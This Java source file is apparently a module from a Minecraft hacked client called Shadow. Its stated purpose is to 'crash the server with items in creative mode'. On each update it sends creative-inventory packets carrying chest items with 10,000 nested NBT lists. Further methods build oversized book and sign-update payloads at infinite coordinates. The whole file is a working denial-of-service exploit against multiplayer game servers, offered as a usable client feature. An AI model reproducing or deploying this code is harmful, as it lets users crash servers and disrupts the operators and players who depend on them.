package net.shadow.feature.module;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.feature.configuration.SliderValue;

import java.util.Random;

public class NettyCrashModule extends Module {
    static World w;
    static int ticks = 0;
    final SliderValue repeat = this.config.create("Packets", 3, 1, 20, 0);

    public NettyCrashModule() {
        super("ItemCrash", "crash the server with items in creative mode", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
        w = Shadow.c.player.clientWorld;
    }

    @Override
    public void onDisable() {
    }


    @Override
    public void onUpdate() {
        NbtCompound tag = new NbtCompound();
        NbtList list = new NbtList();
        ItemStack item = new ItemStack(Items.CHEST, 1);
        for (int i = 0; i < 10000; i++) {
            list.add(new NbtList());
        }
        tag.put("ZeroMemory", list);
        item.setNbt(tag);
        for (int i = 0; i < repeat.getThis(); i++) {
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(3, item));
        }
    }


    @Override
    public void onRender() {

    }

    private void clickunicode() {
        NbtCompound tag = new NbtCompound();
        NbtList list = new NbtList();
        ItemStack item = new ItemStack(Items.CHEST, 1);
        for (int i = 0; i < 10000; i++) {
            list.add(new NbtList());
        }
        tag.put("zero", list);
        item.setNbt(tag);
        for (int i = 0; i < repeat.getThis(); i++) {
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(3, item));
        }
    }

    private void givernd() {
        for (int j = 0; j < repeat.getThis(); j++) {
            ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
            NbtCompound tag = new NbtCompound();
            NbtList list = new NbtList();
            for (int i = 0; i < 300; i++) {
                list.add(NbtString.of("::::::::::".repeat(25)));
            }
            tag.put("author", NbtString.of(rndStr(200)));
            tag.put("title", NbtString.of(rndStr(200)));
            tag.put("pages", list);
            crash.setNbt(tag);
            if (j == 36 + Shadow.c.player.getInventory().selectedSlot) {
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(5 + j, new ItemStack(Items.AIR, 1)));
                return;
            }
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(j, crash));
        }
    }


    private void givenetty() {
        ItemStack crash = new ItemStack(Items.WRITABLE_BOOK, 1);
        String netty = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
        NbtCompound tag = new NbtCompound();
        NbtList list = new NbtList();
        for (int i = 0; i < 15; i++) {
            list.add(NbtString.of(netty));
        }
        tag.put("author", NbtString.of(Shadow.c.player.getGameProfile().getName()));
        tag.put("title", NbtString.of("Shadow"));
        tag.put("pages", list);
        crash.setNbt(tag);
        for (int i = 0; i < repeat.getThis(); i++) {
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(3, crash));
        }
    }


    private void signupdate() {
        Random r = new Random();
        String[] lines = new String[4];
        for (int i = 0; i < 4; i++) {
            StringBuilder line = new StringBuilder();
            for (int j = 0; j < 0; j++) {
                if (r.nextBoolean()) {
                    line.append("⵹");
                } else {
                    line.append(":");
                }
            }
            lines[i] = line.toString();
        }
        for (int i = 0; i < repeat.getThis(); i++) {
            Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), true)));
            Shadow.c.player.networkHandler.sendPacket(new UpdateSignC2SPacket(new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), lines[0], lines[1], lines[2], lines[3]));
        }
    }

    private String rndStr(int size) {
        StringBuilder buf = new StringBuilder();
        String[] chars = new String[]{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"};
        Random r = new Random();
        for (int i = 0; i < size; i++) {
            buf.append(chars[r.nextInt(chars.length)]);
        }
        return buf.toString();
    }


    private void clientClickSlot(int syncId, int slotId, int button, SlotActionType actionType, ItemStack stack) {
        ScreenHandler screenHandler = Shadow.c.player.currentScreenHandler;
        Int2ObjectOpenHashMap<ItemStack> int2ObjectMap = new Int2ObjectOpenHashMap<>();
        int2ObjectMap.put(slotId, stack.copy());
        Shadow.c.player.networkHandler.sendPacket(new ClickSlotC2SPacket(syncId, screenHandler.getRevision(), slotId, button, actionType, screenHandler.getCursorStack().copy(), int2ObjectMap));
    }
}

